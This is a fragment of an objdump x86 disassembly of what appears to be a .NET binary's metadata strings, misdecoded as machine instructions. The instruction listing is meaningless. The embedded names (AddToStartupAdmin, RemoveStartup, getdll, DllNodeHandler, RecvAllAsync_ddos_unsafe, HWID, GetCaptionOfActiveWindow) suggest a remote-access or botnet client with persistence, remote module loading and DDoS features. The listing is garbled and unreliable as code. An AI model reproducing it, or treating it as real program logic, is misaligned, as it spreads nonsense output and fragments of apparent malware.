  409434:	6e                   	outsb  %ds:(%esi),(%dx)
  409435:	74 33                	je     0x40946a
  409437:	32 00                	xor    (%eax),%al
  409439:	3c 64                	cmp    $0x64,%al
  40943b:	61                   	popa
  40943c:	74 61                	je     0x40949f
  40943e:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  409444:	3c 74                	cmp    $0x74,%al
  409446:	65 6d                	gs insl (%dx),%es:(%edi)
  409448:	70 58                	jo     0x4094a2
  40944a:	6d                   	insl   (%dx),%es:(%edi)
  40944b:	6c                   	insb   (%dx),%es:(%edi)
  40944c:	46                   	inc    %esi
  40944d:	69 6c 65 3e 35 5f 5f 	imul   $0x325f5f35,0x3e(%ebp,%eiz,2),%ebp
  409454:	32 
  409455:	00 3c 67             	add    %bh,(%edi,%eiz,2)
  409458:	65 74 64             	gs je  0x4094bf
  40945b:	6c                   	insb   (%dx),%es:(%edi)
  40945c:	6c                   	insb   (%dx),%es:(%edi)
  40945d:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  409463:	3c 63                	cmp    $0x63,%al
  409465:	75 72                	jne    0x4094d9
  409467:	72 77                	jb     0x4094e0
  409469:	69 6e 3e 35 5f 5f 32 	imul   $0x325f5f35,0x3e(%esi),%ebp
  409470:	00 3c 63             	add    %bh,(%ebx,%eiz,2)
  409473:	6f                   	outsl  %ds:(%esi),(%dx)
  409474:	6e                   	outsb  %ds:(%esi),(%dx)
  409475:	6e                   	outsb  %ds:(%esi),(%dx)
  409476:	3e 35 5f 5f 32 00    	ds xor $0x325f5f,%eax
  40947c:	3c 63                	cmp    $0x63,%al
  40947e:	6f                   	outsl  %ds:(%esi),(%dx)
  40947f:	6d                   	insl   (%dx),%es:(%edi)
  409480:	70 3e                	jo     0x4094c0
  409482:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  409487:	3c 73                	cmp    $0x73,%al
  409489:	6f                   	outsl  %ds:(%esi),(%dx)
  40948a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40948d:	74 3e                	je     0x4094cd
  40948f:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  409494:	3c 48                	cmp    $0x48,%al
  409496:	65 61                	gs popa
  409498:	72 62                	jb     0x4094fc
  40949a:	65 61                	gs popa
  40949c:	74 52                	je     0x4094f0
  40949e:	65 70 6c             	gs jo  0x40950d
  4094a1:	79 3e                	jns    0x4094e1
  4094a3:	35 5f 5f 32 00       	xor    $0x325f5f,%eax
  4094a8:	3c 3e                	cmp    $0x3e,%al
  4094aa:	75 5f                	jne    0x40950b
  4094ac:	5f                   	pop    %edi
  4094ad:	32 00                	xor    (%eax),%al
  4094af:	46                   	inc    %esi
  4094b0:	75 6e                	jne    0x409520
  4094b2:	63 60 32             	arpl   %esp,0x32(%eax)
  4094b5:	00 44 69 63          	add    %al,0x63(%ecx,%ebp,2)
  4094b9:	74 69                	je     0x409524
  4094bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4094bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094bd:	61                   	popa
  4094be:	72 79                	jb     0x409539
  4094c0:	60                   	pusha
  4094c1:	32 00                	xor    (%eax),%al
  4094c3:	62 32                	bound  %esi,(%edx)
  4094c5:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  4094c8:	37                   	aaa
  4094c9:	5f                   	pop    %edi
  4094ca:	5f                   	pop    %edi
  4094cb:	77 72                	ja     0x40953f
  4094cd:	61                   	popa
  4094ce:	70 32                	jo     0x409502
  4094d0:	00 3c 52             	add    %bh,(%edx,%edx,2)
  4094d3:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4094d7:	76 65                	jbe    0x40953e
  4094d9:	41                   	inc    %ecx
  4094da:	73 79                	jae    0x409555
  4094dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094dd:	63 3e                	arpl   %edi,(%esi)
  4094df:	64 5f                	fs pop %edi
  4094e1:	5f                   	pop    %edi
  4094e2:	31 33                	xor    %esi,(%ebx)
  4094e4:	00 3c 73             	add    %bh,(%ebx,%esi,2)
  4094e7:	75 62                	jne    0x40954b
  4094e9:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  4094ef:	3c 74                	cmp    $0x74,%al
  4094f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4094f2:	74 61                	je     0x409555
  4094f4:	6c                   	insb   (%dx),%es:(%edi)
  4094f5:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  4094fb:	3c 48                	cmp    $0x48,%al
  4094fd:	65 61                	gs popa
  4094ff:	72 62                	jb     0x409563
  409501:	65 61                	gs popa
  409503:	74 46                	je     0x40954b
  409505:	61                   	popa
  409506:	69 6c 3e 35 5f 5f 33 	imul   $0x335f5f,0x35(%esi,%edi,1),%ebp
  40950d:	00 
  40950e:	3c 68                	cmp    $0x68,%al
  409510:	61                   	popa
  409511:	73 64                	jae    0x409577
  409513:	6c                   	insb   (%dx),%es:(%edi)
  409514:	6c                   	insb   (%dx),%es:(%edi)
  409515:	3e 35 5f 5f 33 00    	ds xor $0x335f5f,%eax
  40951b:	3c 70                	cmp    $0x70,%al
  40951d:	72 6f                	jb     0x40958e
  40951f:	63 65 73             	arpl   %esp,0x73(%ebp)
  409522:	73 3e                	jae    0x409562
  409524:	35 5f 5f 33 00       	xor    $0x335f5f,%eax
  409529:	3c 43                	cmp    $0x43,%al
  40952b:	72 65                	jb     0x409592
  40952d:	61                   	popa
  40952e:	74 65                	je     0x409595
  409530:	53                   	push   %ebx
  409531:	75 62                	jne    0x409595
  409533:	53                   	push   %ebx
  409534:	6f                   	outsl  %ds:(%esi),(%dx)
  409535:	63 6b 3e             	arpl   %ebp,0x3e(%ebx)
  409538:	64 5f                	fs pop %edi
  40953a:	5f                   	pop    %edi
  40953b:	33 00                	xor    (%eax),%eax
  40953d:	3c 44                	cmp    $0x44,%al
  40953f:	6c                   	insb   (%dx),%es:(%edi)
  409540:	6c                   	insb   (%dx),%es:(%edi)
  409541:	4e                   	dec    %esi
  409542:	6f                   	outsl  %ds:(%esi),(%dx)
  409543:	64 65 48             	fs gs dec %eax
  409546:	61                   	popa
  409547:	6e                   	outsb  %ds:(%esi),(%dx)
  409548:	64 6c                	fs insb (%dx),%es:(%edi)
  40954a:	65 72 3e             	gs jb  0x40958b
  40954d:	64 5f                	fs pop %edi
  40954f:	5f                   	pop    %edi
  409550:	33 00                	xor    (%eax),%eax
  409552:	3c 3e                	cmp    $0x3e,%al
  409554:	75 5f                	jne    0x4095b5
  409556:	5f                   	pop    %edi
  409557:	33 00                	xor    (%eax),%eax
  409559:	3c 53                	cmp    $0x53,%al
  40955b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40955d:	64 41                	fs inc %ecx
  40955f:	73 79                	jae    0x4095da
  409561:	6e                   	outsb  %ds:(%esi),(%dx)
  409562:	63 3e                	arpl   %edi,(%esi)
  409564:	64 5f                	fs pop %edi
  409566:	5f                   	pop    %edi
  409567:	31 34 00             	xor    %esi,(%eax,%eax,1)
  40956a:	31 44 31 43          	xor    %eax,0x43(%ecx,%esi,1)
  40956e:	43                   	inc    %ebx
  40956f:	33 35 45 41 36 31    	xor    0x31364145,%esi
  409575:	33 33                	xor    (%ebx),%esi
  409577:	31 43 35             	xor    %eax,0x35(%ebx)
  40957a:	41                   	inc    %ecx
  40957b:	38 35 44 32 41 39    	cmp    %dh,0x39413244
  409581:	36 30 36             	xor    %dh,%ss:(%esi)
  409584:	31 31                	xor    %esi,(%ecx)
  409586:	31 35 33 45 33 37    	xor    %esi,0x37334533
  40958c:	41                   	inc    %ecx
  40958d:	36 32 44 43 44       	xor    %ss:0x44(%ebx,%eax,2),%al
  409592:	39 31                	cmp    %esi,(%ecx)
  409594:	36 32 36             	xor    %ss:(%esi),%dh
  409597:	39 44 36 45          	cmp    %eax,0x45(%esi,%esi,1)
  40959b:	33 42 35             	xor    0x35(%edx),%eax
  40959e:	41                   	inc    %ecx
  40959f:	30 44 41 43          	xor    %al,0x43(%ecx,%eax,2)
  4095a3:	32 45 46             	xor    0x46(%ebp),%al
  4095a6:	33 38                	xor    (%eax),%edi
  4095a8:	32 34 00             	xor    (%eax,%eax,1),%dh
  4095ab:	49                   	dec    %ecx
  4095ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ad:	74 36                	je     0x4095e5
  4095af:	34 00                	xor    $0x0,%al
  4095b1:	3c 66                	cmp    $0x66,%al
  4095b3:	61                   	popa
  4095b4:	69 6c 3e 35 5f 5f 34 	imul   $0x345f5f,0x35(%esi,%edi,1),%ebp
  4095bb:	00 
  4095bc:	3c 73                	cmp    $0x73,%al
  4095be:	6f                   	outsl  %ds:(%esi),(%dx)
  4095bf:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4095c2:	74 3e                	je     0x409602
  4095c4:	35 5f 5f 34 00       	xor    $0x345f5f,%eax
  4095c9:	3c 64                	cmp    $0x64,%al
  4095cb:	61                   	popa
  4095cc:	74 61                	je     0x40962f
  4095ce:	4c                   	dec    %esp
  4095cf:	65 66 74 3e          	gs data16 je 0x409611
  4095d3:	35 5f 5f 34 00       	xor    $0x345f5f,%eax
  4095d8:	3c 52                	cmp    $0x52,%al
  4095da:	65 63 76 41          	arpl   %esi,%gs:0x41(%esi)
  4095de:	6c                   	insb   (%dx),%es:(%edi)
  4095df:	6c                   	insb   (%dx),%es:(%edi)
  4095e0:	41                   	inc    %ecx
  4095e1:	73 79                	jae    0x40965c
  4095e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4095e4:	63 5f 64             	arpl   %ebx,0x64(%edi)
  4095e7:	64 6f                	outsl  %fs:(%esi),(%dx)
  4095e9:	73 5f                	jae    0x40964a
  4095eb:	75 6e                	jne    0x40965b
  4095ed:	73 61                	jae    0x409650
  4095ef:	66 65 72 3e          	data16 gs jb 0x409631
  4095f3:	64 5f                	fs pop %edi
  4095f5:	5f                   	pop    %edi
  4095f6:	34 00                	xor    $0x0,%al
  4095f8:	46                   	inc    %esi
  4095f9:	75 6e                	jne    0x409669
  4095fb:	63 60 34             	arpl   %esp,0x34(%eax)
  4095fe:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  409601:	37                   	aaa
  409602:	5f                   	pop    %edi
  409603:	5f                   	pop    %edi
  409604:	77 72                	ja     0x409678
  409606:	61                   	popa
  409607:	70 34                	jo     0x40963d
  409609:	00 3c 43             	add    %bh,(%ebx,%eax,2)
  40960c:	6f                   	outsl  %ds:(%esi),(%dx)
  40960d:	6e                   	outsb  %ds:(%esi),(%dx)
  40960e:	6e                   	outsb  %ds:(%esi),(%dx)
  40960f:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  409614:	64 53                	fs push %ebx
  409616:	65 74 75             	gs je  0x40968e
  409619:	70 41                	jo     0x40965c
  40961b:	73 79                	jae    0x409696
  40961d:	6e                   	outsb  %ds:(%esi),(%dx)
  40961e:	63 3e                	arpl   %edi,(%esi)
  409620:	64 5f                	fs pop %edi
  409622:	5f                   	pop    %edi
  409623:	31 35 00 3c 65 3e    	xor    %esi,0x3e653c00
  409629:	35 5f 5f 35 00       	xor    $0x355f5f,%eax
  40962e:	3c 73                	cmp    $0x73,%al
  409630:	74 61                	je     0x409693
  409632:	72 74                	jb     0x4096a8
  409634:	54                   	push   %esp
  409635:	69 6d 65 73 74 61 6d 	imul   $0x6d617473,0x65(%ebp),%ebp
  40963c:	70 3e                	jo     0x40967c
  40963e:	35 5f 5f 35 00       	xor    $0x355f5f,%eax
  409643:	3c 47                	cmp    $0x47,%al
  409645:	65 74 41             	gs je  0x409689
  409648:	6e                   	outsb  %ds:(%esi),(%dx)
  409649:	64 53                	fs push %ebx
  40964b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40964d:	64 49                	fs dec %ecx
  40964f:	6e                   	outsb  %ds:(%esi),(%dx)
  409650:	66 6f                	outsw  %ds:(%esi),(%dx)
  409652:	3e 64 5f             	ds fs pop %edi
  409655:	5f                   	pop    %edi
  409656:	35 00 3c 52 65       	xor    $0x65523c00,%eax
  40965b:	63 76 41             	arpl   %esi,0x41(%esi)
  40965e:	6c                   	insb   (%dx),%es:(%edi)
  40965f:	6c                   	insb   (%dx),%es:(%edi)
  409660:	41                   	inc    %ecx
  409661:	73 79                	jae    0x4096dc
  409663:	6e                   	outsb  %ds:(%esi),(%dx)
  409664:	63 5f 64             	arpl   %ebx,0x64(%edi)
  409667:	64 6f                	outsl  %fs:(%esi),(%dx)
  409669:	73 5f                	jae    0x4096ca
  40966b:	73 61                	jae    0x4096ce
  40966d:	66 65 72 3e          	data16 gs jb 0x4096af
  409671:	64 5f                	fs pop %edi
  409673:	5f                   	pop    %edi
  409674:	35 00 3c 3e 37       	xor    $0x373e3c00,%eax
  409679:	5f                   	pop    %edi
  40967a:	5f                   	pop    %edi
  40967b:	77 72                	ja     0x4096ef
  40967d:	61                   	popa
  40967e:	70 35                	jo     0x4096b5
  409680:	00 3c 52             	add    %bh,(%edx,%edx,2)
  409683:	65 6d                	gs insl (%dx),%es:(%edi)
  409685:	6f                   	outsl  %ds:(%esi),(%dx)
  409686:	76 65                	jbe    0x4096ed
  409688:	53                   	push   %ebx
  409689:	74 61                	je     0x4096ec
  40968b:	72 74                	jb     0x409701
  40968d:	75 70                	jne    0x4096ff
  40968f:	3e 64 5f             	ds fs pop %edi
  409692:	5f                   	pop    %edi
  409693:	31 36                	xor    %esi,(%esi)
  409695:	00 3c 6c             	add    %bh,(%esp,%ebp,2)
  409698:	61                   	popa
  409699:	73 74                	jae    0x40970f
  40969b:	53                   	push   %ebx
  40969c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40969e:	64 54                	fs push %esp
  4096a0:	69 6d 65 3e 35 5f 5f 	imul   $0x5f5f353e,0x65(%ebp),%ebp
  4096a7:	36 00 3c 54          	add    %bh,%ss:(%esp,%edx,2)
  4096ab:	79 70                	jns    0x40971d
  4096ad:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  4096b1:	63 65 69             	arpl   %esp,0x69(%ebp)
  4096b4:	76 65                	jbe    0x40971b
  4096b6:	3e 64 5f             	ds fs pop %edi
  4096b9:	5f                   	pop    %edi
  4096ba:	36 00 3c 55 6e 69 6e 	add    %bh,%ss:0x736e696e(,%edx,2)
  4096c1:	73 
  4096c2:	74 61                	je     0x409725
  4096c4:	6c                   	insb   (%dx),%es:(%edi)
  4096c5:	6c                   	insb   (%dx),%es:(%edi)
  4096c6:	3e 64 5f             	ds fs pop %edi
  4096c9:	5f                   	pop    %edi
  4096ca:	31 37                	xor    %esi,(%edi)
  4096cc:	00 5f 5f             	add    %bl,0x5f(%edi)
  4096cf:	53                   	push   %ebx
  4096d0:	74 61                	je     0x409733
  4096d2:	74 69                	je     0x40973d
  4096d4:	63 41 72             	arpl   %eax,0x72(%ecx)
  4096d7:	72 61                	jb     0x40973a
  4096d9:	79 49                	jns    0x409724
  4096db:	6e                   	outsb  %ds:(%esi),(%dx)
  4096dc:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  4096e3:	69 
  4096e4:	7a 65                	jp     0x40974b
  4096e6:	3d 37 00 3c 64       	cmp    $0x643c0037,%eax
  4096eb:	6c                   	insb   (%dx),%es:(%edi)
  4096ec:	6c                   	insb   (%dx),%es:(%edi)
  4096ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ee:	61                   	popa
  4096ef:	6d                   	insl   (%dx),%es:(%edi)
  4096f0:	65 3e 35 5f 5f 37 00 	gs ds xor $0x375f5f,%eax
  4096f7:	3c 54                	cmp    $0x54,%al
  4096f9:	79 70                	jns    0x40976b
  4096fb:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  4096ff:	63 65 69             	arpl   %esp,0x69(%ebp)
  409702:	76 65                	jbe    0x409769
  409704:	3e 64 5f             	ds fs pop %edi
  409707:	5f                   	pop    %edi
  409708:	37                   	aaa
  409709:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  40970c:	75 74                	jne    0x409782
  40970e:	68 65 6e 74 69       	push   $0x69746e65
  409713:	63 61 74             	arpl   %esp,0x74(%ecx)
  409716:	65 41                	gs inc %ecx
  409718:	73 79                	jae    0x409793
  40971a:	6e                   	outsb  %ds:(%esi),(%dx)
  40971b:	63 3e                	arpl   %edi,(%esi)
  40971d:	64 5f                	fs pop %edi
  40971f:	5f                   	pop    %edi
  409720:	31 38                	xor    %edi,(%eax)
  409722:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  409725:	64 64 54             	fs fs push %esp
  409728:	6f                   	outsl  %ds:(%esi),(%dx)
  409729:	53                   	push   %ebx
  40972a:	74 61                	je     0x40978d
  40972c:	72 74                	jb     0x4097a2
  40972e:	75 70                	jne    0x4097a0
  409730:	4e                   	dec    %esi
  409731:	6f                   	outsl  %ds:(%esi),(%dx)
  409732:	6e                   	outsb  %ds:(%esi),(%dx)
  409733:	41                   	inc    %ecx
  409734:	64 6d                	fs insl (%dx),%es:(%edi)
  409736:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40973d:	38 00                	cmp    %al,(%eax)
  40973f:	67 65 74 5f          	addr16 gs je 0x4097a2
  409743:	55                   	push   %ebp
  409744:	54                   	push   %esp
  409745:	46                   	inc    %esi
  409746:	38 00                	cmp    %al,(%eax)
  409748:	3c 65                	cmp    $0x65,%al
  40974a:	3e 35 5f 5f 38 00    	ds xor $0x385f5f,%eax
  409750:	3c 47                	cmp    $0x47,%al
  409752:	65 74 43             	gs je  0x409798
  409755:	61                   	popa
  409756:	70 74                	jo     0x4097cc
  409758:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40975f:	74 69                	je     0x4097ca
  409761:	76 65                	jbe    0x4097c8
  409763:	57                   	push   %edi
  409764:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  40976b:	79 6e                	jns    0x4097db
  40976d:	63 3e                	arpl   %edi,(%esi)
  40976f:	64 5f                	fs pop %edi
  409771:	5f                   	pop    %edi
  409772:	38 00                	cmp    %al,(%eax)
  409774:	3c 73                	cmp    $0x73,%al
  409776:	65 74 53             	gs je  0x4097cc
  409779:	65 74 49             	gs je  0x4097c5
  40977c:	64 3e 64 5f          	fs ds fs pop %edi
  409780:	5f                   	pop    %edi
  409781:	38 00                	cmp    %al,(%eax)
  409783:	3c 41                	cmp    $0x41,%al
  409785:	64 64 54             	fs fs push %esp
  409788:	6f                   	outsl  %ds:(%esi),(%dx)
  409789:	53                   	push   %ebx
  40978a:	74 61                	je     0x4097ed
  40978c:	72 74                	jb     0x409802
  40978e:	75 70                	jne    0x409800
  409790:	41                   	inc    %ecx
  409791:	64 6d                	fs insl (%dx),%es:(%edi)
  409793:	69 6e 3e 64 5f 5f 31 	imul   $0x315f5f64,0x3e(%esi),%ebp
  40979a:	39 00                	cmp    %eax,(%eax)
  40979c:	3c 3e                	cmp    $0x3e,%al
  40979e:	39 00                	cmp    %eax,(%eax)
  4097a0:	3c 53                	cmp    $0x53,%al
  4097a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097a4:	64 41                	fs inc %ecx
  4097a6:	73 79                	jae    0x409821
  4097a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097a9:	63 3e                	arpl   %edi,(%esi)
  4097ab:	64 5f                	fs pop %edi
  4097ad:	5f                   	pop    %edi
  4097ae:	39 00                	cmp    %eax,(%eax)
  4097b0:	3c 54                	cmp    $0x54,%al
  4097b2:	79 70                	jns    0x409824
  4097b4:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  4097b8:	63 65 69             	arpl   %esp,0x69(%ebp)
  4097bb:	76 65                	jbe    0x409822
  4097bd:	3e 64 5f             	ds fs pop %edi
  4097c0:	5f                   	pop    %edi
  4097c1:	39 00                	cmp    %eax,(%eax)
  4097c3:	3c 4d                	cmp    $0x4d,%al
  4097c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4097c6:	64 75 6c             	fs jne 0x409835
  4097c9:	65 3e 00 3c 4d 61 69 	gs add %bh,%ds:0x3e6e6961(,%ecx,2)
  4097d0:	6e 3e 
  4097d2:	00 3c 50             	add    %bh,(%eax,%edx,2)
  4097d5:	72 69                	jb     0x409840
  4097d7:	76 61                	jbe    0x40983a
  4097d9:	74 65                	je     0x409840
  4097db:	49                   	dec    %ecx
  4097dc:	6d                   	insl   (%dx),%es:(%edi)
  4097dd:	70 6c                	jo     0x40984b
  4097df:	65 6d                	gs insl (%dx),%es:(%edi)
  4097e1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097e3:	74 61                	je     0x409846
  4097e5:	74 69                	je     0x409850
  4097e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4097e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4097e9:	44                   	inc    %esp
  4097ea:	65 74 61             	gs je  0x40984e
  4097ed:	69 6c 73 3e 00 36 33 	imul   $0x30333600,0x3e(%ebx,%esi,2),%ebp
  4097f4:	30 
  4097f5:	44                   	inc    %esp
  4097f6:	43                   	inc    %ebx
  4097f7:	44                   	inc    %esp
  4097f8:	32 39                	xor    (%ecx),%bh
  4097fa:	36 36 43             	ss ss inc %ebx
  4097fd:	34 33                	xor    $0x33,%al
  4097ff:	33 36                	xor    (%esi),%esi
  409801:	36 39 31             	cmp    %esi,%ss:(%ecx)
  409804:	31 32                	xor    %esi,(%edx)
  409806:	35 34 34 38 42       	xor    $0x42383434,%eax
  40980b:	42                   	inc    %edx
  40980c:	42                   	inc    %edx
  40980d:	32 35 42 34 46 46    	xor    0x46463442,%dh
  409813:	34 31                	xor    $0x31,%al
  409815:	32 41 34             	xor    0x34(%ecx),%al
  409818:	39 43 37             	cmp    %eax,0x37(%ebx)
  40981b:	33 32                	xor    (%edx),%esi
  40981d:	44                   	inc    %esp
  40981e:	42                   	inc    %edx
  40981f:	32 43 38             	xor    0x38(%ebx),%al
  409822:	41                   	inc    %ecx
  409823:	42                   	inc    %edx
  409824:	43                   	inc    %ebx
  409825:	31 42 38             	xor    %eax,0x38(%edx)
  409828:	35 38 31 42 44       	xor    $0x44423138,%eax
  40982d:	37                   	aaa
  40982e:	31 30                	xor    %esi,(%eax)
  409830:	44                   	inc    %esp
  409831:	44                   	inc    %esp
  409832:	00 48 57             	add    %cl,0x57(%eax)
  409835:	49                   	dec    %ecx
  409836:	44                   	inc    %esp
  409837:	00 67 65             	add    %ah,0x65(%edi)
  40983a:	74 5f                	je     0x40989b
  40983c:	41                   	inc    %ecx
  40983d:	53                   	push   %ebx
  40983e:	43                   	inc    %ebx
  40983f:	49                   	dec    %ecx
  409840:	49                   	dec    %ecx
  409841:	00 43 4f             	add    %al,0x4f(%ebx)
  409844:	4d                   	dec    %ebp
  409845:	50                   	push   %eax
  409846:	52                   	push   %edx
  409847:	45                   	inc    %ebp
  409848:	53                   	push   %ebx
  409849:	53                   	push   %ebx
  40984a:	49                   	dec    %ecx
  40984b:	4f                   	dec    %edi
  40984c:	4e                   	dec    %esi
  40984d:	5f                   	pop    %edi
  40984e:	45                   	inc    %ebp
  40984f:	4e                   	dec    %esi
  409850:	47                   	inc    %edi
  409851:	49                   	dec    %ecx
  409852:	4e                   	dec    %esi
  409853:	45                   	inc    %ebp
  409854:	5f                   	pop    %edi
  409855:	4d                   	dec    %ebp
  409856:	41                   	inc    %ecx
  409857:	58                   	pop    %eax
  409858:	49                   	dec    %ecx
  409859:	4d                   	dec    %ebp
  40985a:	55                   	push   %ebp
  40985b:	4d                   	dec    %ebp
  40985c:	00 4c 41 53          	add    %cl,0x53(%ecx,%eax,2)
  409860:	54                   	push   %esp
  409861:	49                   	dec    %ecx
  409862:	4e                   	dec    %esi
  409863:	50                   	push   %eax
  409864:	55                   	push   %ebp
  409865:	54                   	push   %esp
  409866:	49                   	dec    %ecx
  409867:	4e                   	dec    %esi
  409868:	46                   	inc    %esi
  409869:	4f                   	dec    %edi
  40986a:	00 53 79             	add    %dl,0x79(%ebx)
  40986d:	73 74                	jae    0x4098e3
  40986f:	65 6d                	gs insl (%dx),%es:(%edi)
  409871:	2e 49                	cs dec %ecx
  409873:	4f                   	dec    %edi
  409874:	00 67 65             	add    %ah,0x65(%edi)
  409877:	74 5f                	je     0x4098d8
  409879:	49                   	dec    %ecx
  40987a:	56                   	push   %esi
  40987b:	00 73 65             	add    %dh,0x65(%ebx)
  40987e:	74 5f                	je     0x4098df
  409880:	49                   	dec    %ecx
  409881:	56                   	push   %esi
  409882:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  409886:	61                   	popa
  409887:	00 6d 73             	add    %ch,0x73(%ebp)
  40988a:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40988d:	6c                   	insb   (%dx),%es:(%edi)
  40988e:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  409895:	53                   	push   %ebx
  409896:	79 73                	jns    0x40990b
  409898:	74 65                	je     0x4098ff
  40989a:	6d                   	insl   (%dx),%es:(%edi)
  40989b:	2e 43                	cs inc %ebx
  40989d:	6f                   	outsl  %ds:(%esi),(%dx)
  40989e:	6c                   	insb   (%dx),%es:(%edi)
  40989f:	6c                   	insb   (%dx),%es:(%edi)
  4098a0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4098a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4098a6:	73 2e                	jae    0x4098d6
  4098a8:	47                   	inc    %edi
  4098a9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098ab:	65 72 69             	gs jb  0x409917
  4098ae:	63 00                	arpl   %eax,(%eax)
  4098b0:	53                   	push   %ebx
  4098b1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098b3:	64 41                	fs inc %ecx
  4098b5:	73 79                	jae    0x409930
  4098b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4098b8:	63 00                	arpl   %eax,(%eax)
  4098ba:	47                   	inc    %edi
  4098bb:	65 74 49             	gs je  0x409907
  4098be:	64 6c                	fs insb (%dx),%es:(%edi)
  4098c0:	65 54                	gs push %esp
  4098c2:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  4098c9:	63 00                	arpl   %eax,(%eax)
  4098cb:	41                   	inc    %ecx
  4098cc:	75 74                	jne    0x409942
  4098ce:	68 65 6e 74 69       	push   $0x69746e65
  4098d3:	63 61 74             	arpl   %esp,0x74(%ecx)
  4098d6:	65 41                	gs inc %ecx
  4098d8:	73 79                	jae    0x409953
  4098da:	6e                   	outsb  %ds:(%esi),(%dx)
  4098db:	63 00                	arpl   %eax,(%eax)
  4098dd:	52                   	push   %edx
  4098de:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4098e2:	76 65                	jbe    0x409949
  4098e4:	41                   	inc    %ecx
  4098e5:	73 79                	jae    0x409960
  4098e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4098e8:	63 00                	arpl   %eax,(%eax)
  4098ea:	43                   	inc    %ebx
  4098eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ee:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  4098f3:	62 53 6f             	bound  %edx,0x6f(%ebx)
  4098f6:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  4098f9:	73 79                	jae    0x409974
  4098fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4098fc:	63 00                	arpl   %eax,(%eax)
  4098fe:	46                   	inc    %esi
  4098ff:	72 6f                	jb     0x409970
  409901:	6d                   	insl   (%dx),%es:(%edi)
  409902:	41                   	inc    %ecx
  409903:	73 79                	jae    0x40997e
  409905:	6e                   	outsb  %ds:(%esi),(%dx)
  409906:	63 00                	arpl   %eax,(%eax)
  409908:	43                   	inc    %ebx
  409909:	6f                   	outsl  %ds:(%esi),(%dx)
  40990a:	6e                   	outsb  %ds:(%esi),(%dx)
  40990b:	6e                   	outsb  %ds:(%esi),(%dx)
  40990c:	65 63 74 41 6e       	arpl   %esi,%gs:0x6e(%ecx,%eax,2)
  409911:	64 53                	fs push %ebx
  409913:	65 74 75             	gs je  0x40998b
  409916:	70 41                	jo     0x409959
  409918:	73 79                	jae    0x409993
  40991a:	6e                   	outsb  %ds:(%esi),(%dx)
  40991b:	63 00                	arpl   %eax,(%eax)
  40991d:	43                   	inc    %ebx
  40991e:	6f                   	outsl  %ds:(%esi),(%dx)
  40991f:	6e                   	outsb  %ds:(%esi),(%dx)
  409920:	6e                   	outsb  %ds:(%esi),(%dx)
  409921:	65 63 74 41 73       	arpl   %esi,%gs:0x73(%ecx,%eax,2)
  409926:	79 6e                	jns    0x409996
  409928:	63 00                	arpl   %eax,(%eax)
  40992a:	47                   	inc    %edi
  40992b:	65 74 43             	gs je  0x409971
  40992e:	61                   	popa
  40992f:	70 74                	jo     0x4099a5
  409931:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  409938:	74 69                	je     0x4099a3
  40993a:	76 65                	jbe    0x4099a1
  40993c:	57                   	push   %edi
  40993d:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  409944:	79 6e                	jns    0x4099b4
  409946:	63 00                	arpl   %eax,(%eax)
  409948:	4c                   	dec    %esp
  409949:	6f                   	outsl  %ds:(%esi),(%dx)
  40994a:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40994d:	41                   	inc    %ecx
  40994e:	6c                   	insb   (%dx),%es:(%edi)
  40994f:	6c                   	insb   (%dx),%es:(%edi)
